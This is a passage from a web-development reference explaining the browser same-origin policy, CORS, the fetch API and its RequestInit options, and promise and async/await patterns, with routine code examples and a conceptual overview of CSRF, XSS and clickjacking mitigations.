Forms can POST to any origin (this predates SOP). The submitting page cannot read the response without CORS headers, but the request executes.

#### Script Tags

Scripts loaded via `<script src="...">` execute in the context of the including page regardless of origin. This creates the foundation for JSONP and also represents a security consideration.

#### Image, CSS, and Media

These resources can be loaded cross-origin:

- `<img>`, `<video>`, `<audio>` tags
- CSS via `<link>` or `@import`
- Fonts via `@font-face`

However, accessing pixel data from cross-origin images (via canvas) or reading CSS rules is restricted without CORS.

### Window References

Scripts can obtain references to windows from different origins through:

- `window.open()`
- `<iframe>` elements
- `window.parent`, `window.top`
- Named window targets

Cross-origin window references permit only limited operations:

- Posting messages via `postMessage()`
- Navigating the window via `location` assignment (write-only)
- Closing windows opened by the script
- Accessing `window.closed`, `window.frames`, `window.length`

Reading properties like `location.href`, accessing the DOM, or calling most methods is blocked.

### Cross-Origin Communication Mechanisms

#### postMessage API

`window.postMessage()` enables controlled cross-origin communication. The sending window calls:

```javascript
targetWindow.postMessage(message, targetOrigin);
```

The receiving window listens:

```javascript
window.addEventListener('message', (event) => {
  // Verify event.origin
  // Process event.data
});
```

**Critical security requirement:** Always verify `event.origin` before processing messages.

#### CORS (Cross-Origin Resource Sharing)

Servers opt-in to cross-origin requests by sending headers:

**Basic CORS headers:**

- `Access-Control-Allow-Origin`: Specifies allowed origins (* or specific origin)
- `Access-Control-Allow-Methods`: Permitted HTTP methods
- `Access-Control-Allow-Headers`: Permitted custom headers
- `Access-Control-Allow-Credentials`: Whether cookies/auth can be included
- `Access-Control-Max-Age`: Preflight cache duration

**Credentialed requests:** When `credentials: 'include'` is used, `Access-Control-Allow-Origin` cannot be `*` and must specify the exact origin.

#### JSONP (Legacy)

JSONP circumvents SOP by using `<script>` tags. The server wraps JSON data in a callback function. This pattern has significant security implications and is largely obsolete due to CORS.

### Browser Storage and SOP

#### Cookies

Cookies don't strictly follow SOP. Their scoping uses:

- `Domain` attribute (can include subdomains)
- `Path` attribute
- `Secure` and `SameSite` attributes

A cookie set with `Domain=.example.com` is accessible to all subdomains.

#### Web Storage

`localStorage` and `sessionStorage` are strictly origin-based. Subdomains are treated as different origins.

#### Cache

HTTP cache is typically origin-scoped, though implementation details vary by browser. [Inference: Some cache poisoning attacks exploit ambiguities in cache scoping.]

### Special Cases and Nuances

#### Data URIs and Blob URLs

Documents loaded from `data:` URLs have unique, opaque origins that don't match any other origin. Blob URLs inherit the origin of the context that created them.

#### File Protocol

`file://` URLs typically have special handling. [Inference: Different browsers treat `file://` origins differently - some treat each file as a unique origin, others treat all local files as same origin.]

#### Extensions and Privileged Contexts

Browser extensions can request permission to bypass SOP for specific origins. These permissions must be explicitly declared in the extension manifest.

#### WebSockets

WebSocket connections use an origin-based security model but with different semantics. The server receives an `Origin` header and decides whether to accept the connection.

### Interaction with Other Security Policies

#### Content Security Policy (CSP)

CSP adds another layer on top of SOP. While SOP controls what can be accessed, CSP controls what can be loaded or executed. CSP can:

- Restrict script sources beyond SOP
- Block inline scripts
- Control form submission targets
- Restrict frame ancestors

#### CORP (Cross-Origin Resource Policy)

CORP headers (`Cross-Origin-Resource-Policy`) allow resources to declare they should only be loaded by same-origin or same-site contexts, protecting against Spectre-like attacks.

#### COEP (Cross-Origin Embedder Policy)

COEP (`Cross-Origin-Embedder-Policy: require-corp`) requires all embedded resources to explicitly opt-in via CORP or CORS.

#### COOP (Cross-Origin Opener Policy)

COOP (`Cross-Origin-Opener-Policy`) isolates browsing context groups, preventing cross-origin windows from accessing each other even through references.

### Common Attack Vectors Related to SOP

#### CSRF (Cross-Site Request Forgery)

SOP doesn't prevent request sending, only response reading. CSRF exploits this by causing authenticated users to send unwanted requests. Mitigations include:

- CSRF tokens
- `SameSite` cookie attribute
- Verifying `Origin`/`Referer` headers
- Custom headers requiring preflight

#### XSS (Cross-Site Scripting)

XSS bypasses SOP by injecting malicious scripts that execute within the victim origin, granting full access to that origin's data.

#### Clickjacking

Overlaying transparent iframes to trick users into clicking unintended targets. Mitigated by:

- `X-Frame-Options` header
- CSP `frame-ancestors` directive

#### CORS Misconfiguration

Common vulnerabilities:

- Reflecting `Origin` header without validation
- Using `Access-Control-Allow-Origin: *` with credentials
- Insufficient validation of allowed origins
- Overly permissive preflight responses

### Implementation Variations

Different browsers implement SOP with slight variations:

**Port handling:** Some older browsers didn't consider ports in origin comparison. Modern browsers consistently include ports.

**Document.domain quirk:** The `document.domain` setter is deprecated and being removed from browsers due to security concerns.

**localhost special cases:** [Inference: Browsers may treat localhost specially, though the exact behavior varies.]

### Performance Considerations

SOP enforcement adds overhead:

- Preflight requests add latency for complex CORS requests
- Cache segregation by origin increases memory usage
- Storage APIs maintain per-origin quotas

**Preflight caching:** The `Access-Control-Max-Age` header allows browsers to cache preflight results, reducing repeated OPTIONS requests.

### Modern Additions and Evolution

#### Fetch Metadata Request Headers

Modern browsers send request metadata headers:

- `Sec-Fetch-Site`: Indicates request's site relationship (same-origin, same-site, cross-site, none)
- `Sec-Fetch-Mode`: Request mode (cors, no-cors, navigate, etc.)
- `Sec-Fetch-Dest`: Request destination (document, script, image, etc.)

Servers can use these for defense-in-depth.

#### Storage Access API

Allows embedded cross-origin iframes to request access to their own first-party storage after user interaction, addressing legitimate third-party embedding scenarios while maintaining privacy.

#### Partitioned Storage

Browsers are moving toward partitioning storage by top-level site in addition to origin, preventing cross-site tracking through storage mechanisms.

---

## Evolution from XMLHttpRequest to Fetch

### The XMLHttpRequest Era

XMLHttpRequest (XHR) emerged in the late 1990s as Microsoft's ActiveX component and became standardized across browsers by the mid-2000s. It enabled asynchronous HTTP requests without page reloads, fundamentally enabling the AJAX revolution that transformed web applications.

#### Core XHR Limitations

XHR's API design reflected its age through several architectural constraints. The event-based model required verbose callback handling with separate event listeners for `onload`, `onerror`, `onprogress`, and `onreadystatechange`. Error handling proved particularly problematic—network failures, HTTP errors, and timeouts required different handling mechanisms, with no unified error pathway.

The callback-centric design made sequential requests deeply nested, creating callback pyramids that harmed readability and maintainability. Developers had no native way to compose multiple requests or handle concurrent operations without external libraries or complex state management.

XHR's configuration model split concerns across multiple method calls. Setting up a request required calling `open()`, configuring properties like `responseType` and `timeout`, calling `setRequestHeader()` for each header, and finally invoking `send()`. This procedural approach made request configuration error-prone and difficult to encapsulate.

The `readyState` property cycled through five states (0-4), requiring developers to check `readyState === 4` before accessing response data. This state machine added complexity to what should be straightforward request handling.

### The Fetch API Architecture

Fetch introduced a promise-based interface that fundamentally restructured how developers interact with HTTP. The API returns promises that resolve to Response objects, enabling promise chaining and async/await patterns that flatten asynchronous code structure.

#### Request and Response Object Model

Fetch treats requests and responses as first-class objects. The Request object encapsulates all request configuration—URL, method, headers, body, credentials, cache mode, and redirect behavior—in a single constructible object. This enables request cloning, inspection, and modification before sending.

The Response object provides a consistent interface for handling server responses. It includes properties like `status`, `statusText`, `ok` (true for 200-299 status codes), and `headers`, plus methods for consuming the body: `text()`, `json()`, `blob()`, `arrayBuffer()`, and `formData()`. Each consumption method returns a promise, maintaining consistency with the overall async model.

The Headers object provides a map-like interface with methods like `get()`, `set()`, `append()`, `delete()`, and `has()`. Headers are mutable on requests but immutable on responses, preventing accidental modification of server data.

#### Streaming and Body Handling

Fetch exposes response bodies as ReadableStreams through the `response.body` property, enabling progressive processing of large payloads without loading entire responses into memory. This streaming capability allows developers to process data chunks as they arrive, implement progress indicators based on actual bytes received, and cancel streams mid-transfer.

The Body mixin (implemented by both Request and Response) provides the `bodyUsed` property, which becomes true after any consumption method is called. This prevents double-reading of streams, which would throw an error. Cloning via `response.clone()` creates independent streams for multiple consumers.

#### Promise-Based Error Handling

Fetch's error model distinguishes between network failures and HTTP errors. The fetch promise only rejects for network-level failures—DNS resolution failures, connection timeouts, or network unavailability. HTTP error status codes (404, 500, etc.) resolve the promise successfully with `response.ok = false`.

This design requires explicit status checking:

```javascript
fetch(url)
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error ${response.status}`);
    }
    return response.json();
  })
  .catch(error => {
    // Handles both network errors and thrown HTTP errors
  });
```

The two-tier error model separates transport failures from application-level errors, giving developers precise control over error handling strategies.

### Advanced Fetch Capabilities

#### Request Configuration Options

The `init` object passed to `fetch()` supports comprehensive configuration. The `mode` option controls CORS behavior with values like `cors`, `no-cors`, `same-origin`, and `navigate`. The `credentials` option determines cookie handling: `omit`, `same-origin`, or `include` for cross-origin cookies.

The `cache` option provides granular control over HTTP caching with values like `default`, `no-store`, `reload`, `no-cache`, `force-cache`, and `only-if-cached`. The `redirect` option specifies redirect handling: `follow`, `error`, or `manual`.

Request integrity can be verified through the `integrity` option, which accepts Subresource Integrity hashes. The `keepalive` option allows requests to continue even if the page that initiated them is closed—useful for analytics beacons.

#### AbortController Integration

Fetch integrates with the AbortController API for request cancellation. Creating an AbortController produces a `signal` object that's passed to fetch options. Calling `controller.abort()` triggers rejection with an `AbortError`, canceling the in-flight request and terminating network activity.

```javascript
const controller = new AbortController();
const signal = controller.signal;

fetch(url, { signal })
  .then(response => response.json())
  .catch(error => {
    if (error.name === 'AbortError') {
      // Request was cancelled
    }
  });

// Later:
controller.abort();
```

AbortController's reusability is limited—each controller can only abort once. Multiple requests can share a single signal, enabling batch cancellation of related operations.

The signal also supports timeout functionality through `AbortSignal.timeout(ms)`, which creates a signal that aborts after the specified duration without requiring explicit controller management.

### Streaming Responses

The ReadableStream interface accessed via `response.body` exposes a `getReader()` method that returns a ReadableStreamDefaultReader. The reader's `read()` method returns promises that resolve to `{done, value}` objects, where `value` is a Uint8Array chunk.

Processing streams requires iterative reading:

```javascript
const reader = response.body.getReader();

async function processStream() {
  while (true) {
    const {done, value} = await reader.read();
    if (done) break;
    // Process Uint8Array chunk
  }
}
```

The async iteration protocol simplifies this pattern:

```javascript
for await (const chunk of response.body) {
  // Process each Uint8Array chunk
}
```

Stream piping enables transformation chains. The `pipeThrough()` method passes streams through TransformStream objects for operations like decompression, decryption, or format conversion. The `pipeTo()` method connects streams to WritableStream destinations.

### Request Deduplication and Caching

[Inference] Fetch doesn't provide built-in request deduplication—multiple identical fetch calls create separate network requests. Service Workers offer one approach to deduplication by intercepting fetch requests and implementing custom caching strategies that check for in-flight requests.

The Cache API, accessible through `caches.open()`, provides programmatic cache management. Cache objects store Request/Response pairs with methods like `put()`, `match()`, and `delete()`. While designed primarily for Service Workers, Cache API is also available in window contexts for application-level caching strategies.

### Middleware and Request Interception

Fetch lacks built-in middleware or interceptor patterns. [Inference] Implementing request/response interception requires wrapping the global `fetch` function or creating factory functions that apply transformations before delegation.

Common patterns include creating fetch wrappers that inject authentication tokens, normalize error handling, add logging, or apply retry logic. These wrappers maintain the fetch API surface while adding cross-cutting concerns:

```javascript
function fetchWithAuth(url, options = {}) {
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${getToken()}`
    }
  });
}
```

Service Workers provide true request interception through the `fetch` event, enabling comprehensive request modification, response synthesis, and offline-first architectures.

### Upload Progress Tracking

Fetch provides no standard mechanism for monitoring upload progress. The `Response` object exposes download progress through the readable stream, but request bodies offer no corresponding progress API.

[Inference] This limitation stems from fetch's streaming request body support—the body can be a ReadableStream that's consumed asynchronously, making progress calculation ambiguous. XMLHttpRequest's `upload.onprogress` event remains the standard approach for upload progress tracking, and many applications use XHR specifically for file uploads while using fetch for other requests.

Some workarounds exist, such as implementing custom ReadableStream sources that track bytes written, but these require manually managing stream construction and lack browser-native progress events.

### Cross-Origin Considerations

Fetch enforces CORS strictly. Requests to cross-origin URLs default to `mode: 'cors'`, requiring proper CORS headers from the server. The `no-cors` mode allows cross-origin requests but severely restricts response access—the Response object becomes opaque with no accessible body, headers, or status information beyond knowing the request succeeded.

Credentials (cookies, HTTP authentication) follow the `credentials` option. The default `same-origin` sends credentials only to same-origin URLs. Cross-origin credential inclusion requires both `credentials: 'include'` and server-side `Access-Control-Allow-Credentials: true` headers with explicit origin specification (no wildcards).

Preflight requests occur for non-simple requests—those with custom headers, methods beyond GET/POST/HEAD, or content types other than application/x-www-form-urlencoded, multipart/form-data, or text/plain. Servers must handle OPTIONS requests with appropriate CORS headers.

### Headers API Behavior

The Headers object implements an iterable interface, supporting `for...of` loops, spread operations, and destructuring. Headers are case-insensitive but preserve original casing. Multiple values for a single header are comma-concatenated per HTTP specifications.

Header guards prevent modification of certain headers based on context. Request headers have a `request` guard preventing modification of forbidden headers like `Host`, `Connection`, or `Content-Length`. Response headers have a `response` guard blocking forbidden response headers. Headers created via `new Headers()` have no guard, allowing unrestricted modification.

The `append()` method adds values to existing headers rather than replacing them, crucial for headers like `Set-Cookie` that support multiple values. The `set()` method replaces existing values entirely.

### Redirect Handling

Fetch follows redirects automatically by default (`redirect: 'follow'`), supporting up to 20 redirects. The final Response reflects the ultimate destination, with `response.url` showing the resolved URL after redirects and `response.redirected` indicating whether redirection occurred.

Setting `redirect: 'error'` causes promises to reject on any redirect attempt, useful for situations requiring explicit redirect handling or preventing redirect-based attacks.

The `redirect: 'manual'` mode provides a Response with type `'opaqueredirect'`, exposing minimal information. This mode enables Service Workers to handle redirects with custom logic while preventing redirect information leakage to page-level JavaScript.

### Type Safety and TypeScript Integration

Fetch's Response methods like `json()` return `Promise<any>` in TypeScript. Developers must provide type assertions or implement type guards for response data. Generic wrappers can improve type safety:

```typescript
async function fetchJSON<T>(url: string): Promise<T> {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`HTTP error ${response.status}`);
  }
  return response.json();
}
```

[Inference] This pattern still relies on runtime trust that the server returns data matching type `T`, as TypeScript cannot validate actual network payloads. Runtime validation libraries like Zod or io-ts provide schema validation for robust type safety.

### Browser Compatibility and Polyfills

Fetch achieved widespread browser support by 2017, with polyfills available for older browsers. The `whatwg-fetch` polyfill provides fetch in environments lacking native support, though with limitations around streaming and advanced features.

Node.js lacked native fetch until version 17.5 (experimental) and 18.0 (stable). Prior to native support, libraries like `node-fetch` provided compatible implementations with Node.js-specific adaptations for streams and request handling.

Differences between browser and Node.js implementations exist around stream handling, file system access, and HTTP agent configuration. Node.js fetch exposes additional options for agent configuration, certificate validation, and DNS resolution that don't exist in browser contexts.

### Performance Characteristics

Fetch's promise-based architecture introduces microtask scheduling overhead compared to XHR's synchronous callback firing. [Inference] For high-frequency request scenarios, this overhead is generally negligible compared to network latency, but may be measurable in local or cached request benchmarks.

Response body consumption methods must be called—calling `response.json()` or other parsers is required even if the body isn't needed, as the stream must be consumed or closed. For fire-and-forget requests with irrelevant responses, explicitly consuming or canceling the body prevents memory leaks.

[Inference] Connection pooling and keep-alive behavior operate at the browser's network stack level, largely transparent to both XHR and fetch. Fetch's ability to clone requests potentially enables better connection reuse through request batching strategies, though this remains implementation-dependent.

### Migration Patterns

Common XHR-to-fetch migrations involve replacing callback patterns with promises or async/await, consolidating request configuration into single initialization objects, and switching from `readyState` checks to promise resolution.

Error handling requires explicit status checking in fetch, replacing XHR's event-based error callbacks. Timeout handling moves from XHR's `timeout` property to AbortSignal integration with timers.

Progress tracking for uploads presents the primary migration challenge, often requiring either XHR retention for upload-heavy operations or implementing custom progress mechanisms through Request body manipulation.

---

# Basic Fetch Syntax

## fetch() Function Signature

### Basic Syntax

```typescript
fetch(resource)
fetch(resource, options)
```

### Parameters

#### `resource` (required)

Defines the resource to fetch. Can be either a string, any object with a stringifier (like a URL object) that provides the URL, or a Request object.

**String/URL types:**

- The URL may be relative to the base URL, which is the document's baseURI in a window context, or WorkerGlobalScope.location in a worker context
- Accepts `URL` objects with stringifiers

**Request object:**

- A constructed `Request` instance containing pre-configured settings

#### `options` (optional)

A RequestInit object containing any custom settings to apply to the request.

### Return Value

A Promise that resolves to a Response object.

**Important behaviors:**

- The promise resolves as soon as the server responds with headers, even if the server response is an HTTP error status
- A fetch() promise does not reject if the server responds with HTTP status codes that indicate errors (404, 504, etc.)
- The promise only rejects for network-level failures

### Exceptions

**`AbortError` DOMException** - The request was aborted due to a call to the AbortController abort() method

**`NotAllowedError` DOMException** - Thrown if use of the Topics API is specifically disallowed by a browsing-topics Permissions Policy, and a fetch() request was made with browsingTopics: true

**`TypeError`** - Can occur for the following reasons: the requested URL is invalid, the requested URL includes credentials, the RequestInit object passed as the value of options included properties with invalid values, the request is blocked by a permissions policy, or there is a network error

---

### RequestInit Options Object

The RequestInit dictionary represents the set of options that can be used to configure a fetch request.

#### Option Merging Behavior

You can construct a Request with a RequestInit, and pass the Request to a fetch() call along with another RequestInit. If you do this, and the same option is set in both places, then the value passed directly into fetch() is used.

#### Available Options

##### `method`

**Type:** String  
**Default:** `"GET"`  
The request method (e.g., `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `HEAD`, `OPTIONS`)

##### `headers`

**Type:** `Headers` object or object literal  
**Default:** undefined  
Any headers you want to add to your request, contained within a Headers object or an object literal whose keys are the names of headers and whose values are the header values

**Restrictions:**

- Many headers are set automatically by the browser and can't be set by a script: these are called Forbidden request headers
- If the mode option is set to no-cors, you can only set CORS-safelisted request headers

**Example formats:**

```javascript
// Object literal
{ headers: { "Content-Type": "application/json" } }

// Headers object
const myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");
{ headers: myHeaders }
```

##### `body`

**Type:** String, ArrayBuffer, Blob, DataView, File, FormData, TypedArray, URLSearchParams, or ReadableStream  
**Default:** undefined  
The request body contains content to send to the server, for example in a POST or PUT request

**Note:** `GET` and `HEAD` requests cannot have a body

##### `mode`

**Type:** String  
**Default:** `"cors"`  
Sets cross-origin behavior for the request

**Values:**

- **`same-origin`** - Disallows cross-origin requests. If a same-origin request is sent to a different origin, the result is a network error
- **`cors`** - If the request is cross-origin then it will use the Cross-Origin Resource Sharing (CORS) mechanism. Only CORS-safelisted response headers are exposed in the response
- **`no-cors`** - Disables CORS for cross-origin requests. This restricts methods to `HEAD`, `GET`, or `POST`, limits headers to CORS-safelisted request headers, and the response is opaque, meaning that its headers and body are not available to JavaScript, and its status code is always 0
- **`navigate`** - Used only by HTML navigation. A navigate request is created only while navigating between documents

##### `credentials`

**Type:** String  
**Default:** `"same-origin"`  
Controls whether or not the browser sends credentials with the request, as well as whether any Set-Cookie response headers are respected

**Values:**

- **`omit`** - Never send credentials in the request or include credentials in the response
- **`same-origin`** - Only send and include credentials for same-origin requests
- **`include`** - Always include credentials, even for cross-origin requests

**Security note:** Including credentials in cross-origin requests can make a site vulnerable to CSRF attacks, so even if credentials is set to include, the server must also agree to their inclusion by including the Access-Control-Allow-Credentials in its response

##### `cache`

**Type:** String  
**Default:** `"default"`  
The cache mode for the request

**Values:**

- **`default`** - The browser looks in its HTTP cache for a response matching the request. If there is a match and it is fresh, it will be returned from the cache. If there is a match but it is stale, the browser will make a conditional request to the remote server
- **`no-store`** - The browser fetches the resource from the remote server without first looking in the cache, and will not update the cache with the downloaded resource
- **`reload`** - The browser fetches the resource from the remote server without first looking in the cache, but then will update the cache with the downloaded resource
- **`no-cache`** - The browser looks in its HTTP cache for a response matching the request. If there is a match, fresh or stale, the browser will make a conditional request to the remote server
- **`force-cache`** - The browser looks in its HTTP cache for a response matching the request. If there is a match, fresh or stale, it will be returned from the cache. If there is no match, the browser will make a normal request
- **`only-if-cached`** (Experimental) - The browser looks in its HTTP cache for a response matching the request. If there is a match, fresh or stale, it will be returned from the cache. If there is no match, a network error is returned. Can only be used with `mode: "same-origin"`

##### `redirect`

**Type:** String  
**Default:** `"follow"`  
Determines the browser's behavior in case the server replies with a redirect status

**Values:**

- **`follow`** - Automatically follow redirects
- **`error`** - Reject the promise with a network error when a redirect status is returned
- **`manual`** - Return a response with almost all fields filtered out, to enable a service worker to store the response and later replay it

##### `referrer`

**Type:** String  
**Default:** `"about:client"`  
A string specifying the value to use for the request's Referer header

**Values:**

- **Same-origin URL** - Set the Referer header to the given value. Relative URLs are resolved relative to the URL of the page that made the request
- **Empty string (`""`)** - Omit the Referer header
- **`"about:client"`** - Set the Referer header to the default value for the context of the request

##### `referrerPolicy`

**Type:** String  
**Default:** undefined  
A string that sets a policy for the Referer header. The syntax and semantics of this option are exactly the same as for the Referrer-Policy header

Values: `no-referrer`, `no-referrer-when-downgrade`, `origin`, `origin-when-cross-origin`, `same-origin`, `strict-origin`, `strict-origin-when-cross-origin`, `unsafe-url`

##### `integrity`

**Type:** String  
**Default:** `""`  
Contains the subresource integrity value of the request

**Format:** `<hash-algo>-<hash-source>` where:

- hash-algo is one of the following values: sha256, sha384, or sha512
- hash-source is the Base64-encoding of the result of hashing the resource with the specified hash algorithm

##### `signal`

**Type:** `AbortSignal`  
**Default:** undefined  
An AbortSignal. If this option is set, the request can be canceled by calling abort() on the corresponding AbortController

##### `keepalive`

**Type:** Boolean  
**Default:** `false`  
When set to true, the browser will not abort the associated request if the page that initiated it is unloaded before the request is complete

**Benefits:**

- Enables a fetch() request to send analytics at the end of a session even if the user navigates away from or closes the page
- You can use HTTP methods other than POST, customize request properties, and access the server response via the fetch Promise fulfillment
- It is also available in service workers

**Limitation:** The body size for keepalive requests is limited to 64 kibibytes

##### `priority`

**Type:** String  
**Default:** `"auto"`  
Specifies the priority of the fetch request relative to other requests of the same type

**Values:**

- **`high`** - A high priority fetch request relative to other requests of the same type
- **`low`** - A low priority fetch request relative to other requests of the same type
- **`auto`** - No user preference for the fetch priority

##### `duplex` (Experimental)

**Type:** String  
**Default:** undefined  
Controls duplex behavior of the request. If this is present it must have the value half, meaning that the browser must send the entire request before processing the response

**Requirement:** This option must be present when body is a ReadableStream

##### `attributionReporting` (Deprecated)

**Type:** Object  
**Default:** undefined  
Indicates that you want the request's response to be able to register a JavaScript-based attribution source or attribution trigger

**Properties:**

- `eventSourceEligible` (boolean) - If set to true, the request's response is eligible to register an attribution source
- `triggerEligible` (boolean) - If set to true, the request's response is eligible to register an attribution trigger

##### `browsingTopics` (Deprecated)

**Type:** Boolean  
**Default:** undefined  
A boolean specifying that the selected topics for the current user should be sent in a Sec-Browsing-Topics header with the associated request

---

### TypeScript Definition

```typescript
function fetch(
  resource: RequestInfo | URL,
  options?: RequestInit
): Promise<Response>;

type RequestInfo = Request | string;

interface RequestInit {
  method?: string;
  headers?: HeadersInit;
  body?: BodyInit | null;
  mode?: RequestMode;
  credentials?: RequestCredentials;
  cache?: RequestCache;
  redirect?: RequestRedirect;
  referrer?: string;
  referrerPolicy?: ReferrerPolicy;
  integrity?: string;
  signal?: AbortSignal | null;
  keepalive?: boolean;
  priority?: RequestPriority;
  duplex?: RequestDuplex;
  attributionReporting?: AttributionReportingRequestOptions;
  browsingTopics?: boolean;
}

type RequestMode = "cors" | "no-cors" | "same-origin" | "navigate";
type RequestCredentials = "omit" | "same-origin" | "include";
type RequestCache = "default" | "no-store" | "reload" | "no-cache" | "force-cache" | "only-if-cached";
type RequestRedirect = "follow" | "error" | "manual";
type RequestPriority = "high" | "low" | "auto";
type RequestDuplex = "half";

type HeadersInit = Headers | string[][] | Record<string, string>;
type BodyInit = Blob | BufferSource | FormData | URLSearchParams | ReadableStream | string;
```

---

## Promise-Based Architecture

### Core Architecture Patterns

#### Promise Chain Architecture

Promise chains form the backbone of sequential asynchronous operations. Each `.then()` returns a new promise, enabling composition where the output of one operation feeds into the next. The chain maintains a single execution path with automatic error propagation through `.catch()` handlers.

```javascript
fetchUser(id)
  .then(user => fetchPermissions(user.id))
  .then(permissions => validateAccess(permissions))
  .then(access => loadResource(access))
  .catch(handleError);
```

The chain architecture enforces explicit data flow - transformations occur at each step, and errors bypass intermediate handlers until caught. This creates predictable execution sequences where state transformations are localized to individual promise handlers.

#### Promise Coordination Patterns

Multiple promises require coordination strategies based on dependency relationships:

**Parallel Execution** - `Promise.all()` waits for all promises to resolve, failing fast on the first rejection. This suits independent operations where all results are required:

```javascript
Promise.all([
  fetchUserData(id),
  fetchUserPosts(id),
  fetchUserFollowers(id)
]).then(([user, posts, followers]) => {
  // All data available simultaneously
});
```

**Race Conditions** - `Promise.race()` resolves or rejects with the first settled promise. This enables timeout implementations, fallback mechanisms, and competitive resource fetching:

```javascript
Promise.race([
  fetchFromPrimaryServer(),
  fetchFromBackupServer(),
  timeout(5000)
]);
```

**Partial Success Handling** - `Promise.allSettled()` waits for all promises regardless of outcome, returning status objects. This allows processing whatever succeeded while handling failures independently:

```javascript
const results = await Promise.allSettled(operations);
const succeeded = results.filter(r => r.status === 'fulfilled');
const failed = results.filter(r => r.status === 'rejected');
```

**First Success Pattern** - `Promise.any()` resolves with the first successful promise, ignoring rejections unless all fail. This suits redundant operations where any successful result suffices.

### State Management in Promise Architecture

#### Promise State Lifecycle

Promises exist in three states: pending (initial), fulfilled (successful completion), or rejected (failed). This state is immutable once settled - a fulfilled promise cannot transition to rejected or vice versa. The immutability guarantees prevent race conditions in state observation.

State transitions trigger registered handlers asynchronously. Even if a promise is already settled when `.then()` is called, the handler executes asynchronously on the next microtask checkpoint. This consistent asynchronous behavior prevents timing-dependent bugs.

#### Internal State Representation

[Inference] Promise implementations typically maintain internal slots for state, result value, and handler queues. When pending, the promise accumulates fulfillment and rejection handlers in queues. Upon settlement, the promise stores the result value and drains the handler queues, executing each callback with the stored value.

The internal state encapsulation ensures external code cannot directly mutate promise state - only the resolver function provided during promise construction can trigger state transitions.

#### State Observation Without Mutation

Promises expose state through handler registration rather than direct inspection. Code observes state changes by attaching callbacks that execute upon settlement. This observer pattern decouples state producers from consumers:

```javascript
const promise = asyncOperation();

// Consumer 1 observes eventual state
promise.then(handleSuccess);

// Consumer 2 observes same state independently
promise.then(processResult);

// Both receive the same settled value
```

Multiple observers receive the same settled value without interfering with each other. The promise memorizes its result, delivering it to all current and future observers.

### Error Handling Architecture

#### Error Propagation Mechanics

Errors in promise chains propagate automatically until caught. When a promise rejects or a `.then()` handler throws, the rejection travels down the chain bypassing fulfillment handlers until encountering a rejection handler:

```javascript
fetchData()
  .then(parseJSON)      // Throws on invalid JSON
  .then(validateSchema) // Skipped if parseJSON throws
  .then(processData)    // Skipped if validation fails
  .catch(handleError);  // Catches any upstream error
```

This creates implicit try-catch blocks around each handler. Synchronous exceptions automatically convert to promise rejections, unifying error handling for both sync and async failures.

#### Error Recovery Patterns

Rejection handlers can recover from errors by returning normal values, converting rejection back to fulfillment:

```javascript
fetchPrimaryData()
  .catch(err => {
    console.warn('Primary failed, using cache');
    return getCachedData(); // Recovery: rejection → fulfillment
  })
  .then(processData); // Receives either primary or cached data
```

Returning a rejected promise or throwing in a `.catch()` handler continues the error state, enabling error transformation:

```javascript
operation()
  .catch(err => {
    if (err.retryable) {
      return retry(operation);
    }
    throw new ApplicationError('Operation failed permanently', err);
  });
```

#### Unhandled Rejection Architecture

Promises without rejection handlers generate unhandled rejection events when rejected. [Inference] Runtime environments track promises without attached rejection handlers and emit warnings or events when such promises reject. This detection typically involves monitoring whether rejection handlers exist when a promise settles.

Modern environments provide `unhandledrejection` events (browsers) or `unhandledRejection` events (Node.js) that fire when rejections go unhandled, enabling centralized error logging:

```javascript
window.addEventListener('unhandledrejection', event => {
  console.error('Unhandled rejection:', event.reason);
  logToMonitoring(event.reason);
});
```

### Composition and Abstraction Patterns

#### Promise-Returning Function Design

Functions returning promises establish contracts about asynchronous completion. The returned promise represents the eventual outcome of the operation:

```javascript
function loadUserProfile(userId) {
  return fetch(`/api/users/${userId}`)
    .then(response => response.json())
    .then(data => new UserProfile(data));
}
```

This pattern enables composition where promise-returning functions call other promise-returning functions, building complex asynchronous workflows from simpler operations. The promise return type signals asynchronous behavior to callers without requiring callback parameters.

#### Higher-Order Promise Functions

Functions that accept promises as arguments or return promise-manipulating functions enable abstraction over asynchronous patterns:

```javascript
function timeout(ms) {
  return new Promise((resolve, reject) => {
    setTimeout(() => reject(new Error('Timeout')), ms);
  });
}

function withTimeout(promise, ms) {
  return Promise.race([promise, timeout(ms)]);
}

// Usage creates timeout-wrapped operations
const result = await withTimeout(slowOperation(), 5000);
```

These abstractions encapsulate cross-cutting concerns like timeouts, retries, and rate limiting without modifying core operation implementations.

#### Promise Middleware Patterns

Middleware architectures apply transformations or side effects to promise chains:

```javascript
function withLogging(promiseFn) {
  return function(...args) {
    console.log('Starting operation');
    return promiseFn(...args)
      .then(result => {
        console.log('Operation succeeded');
        return result;
      })
      .catch(err => {
        console.error('Operation failed');
        throw err;
      });
  };
}

const loggedFetch = withLogging(fetch);
```

This pattern separates concerns by wrapping promise-returning functions with additional behavior while preserving the promise interface.

### Async/Await as Architectural Sugar

#### Syntactic Transform to Promises

Async functions are promises with synchronous-looking syntax. An `async` function always returns a promise - returned values automatically wrap in `Promise.resolve()`, and thrown errors convert to rejections:

```javascript
async function fetchUserData(id) {
  const response = await fetch(`/api/users/${id}`);
  return response.json(); // Automatically wrapped in Promise.resolve()
}

// Equivalent to:
function fetchUserData(id) {
  return fetch(`/api/users/${id}`)
    .then(response => response.json());
}
```

The `await` keyword unwraps promises, pausing function execution until the promise settles. This creates sequential appearance while maintaining non-blocking behavior.

#### Error Handling Transformation

Try-catch blocks in async functions map to promise rejection handling:

```javascript
async function loadData() {
  try {
    const data = await fetchData();
    return processData(data);
  } catch (error) {
    return getDefaultData();
  }
}

// Promise equivalent:
function loadData() {
  return fetchData()
    .then(processData)
    .catch(getDefaultData);
}
```

This syntactic transformation makes error handling appear synchronous while preserving promise semantics. Uncaught exceptions in async functions become unhandled promise rejections.

#### Control Flow Preservation

Async/await maintains standard control flow constructs unavailable in promise chains:

```javascript
async function processItems(items) {
  const results = [];
  for (const item of items) {
    const result = await processItem(item);
    if (result.shouldContinue) {
      results.push(result);
    } else {
      break; // Early exit from async loop
    }
  }
  return results;
}
```

Loops, conditionals, and early returns work naturally with async/await but require complex promise chain construction. This makes async/await preferable for intricate control flow while simple chains remain clearer for linear pipelines.

### Memory and Performance Architecture

#### Promise Overhead Characteristics

